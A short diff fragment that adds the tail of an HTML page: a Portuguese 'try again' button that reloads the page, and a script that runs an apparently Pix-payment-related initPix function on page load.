+            <button onclick="window.location.reload()" style="margin-top:12px;padding:10px 20px;background:#0042DA;color:white;border:none;border-radius:8px;cursor:pointer;font-size:14px;">
+              Tentar novamente
+            </button>
+          </p>`;
+      }
+    }
+
+    window.addEventListener('load', initPix);
+  </script>
+
+</body>
+</html>
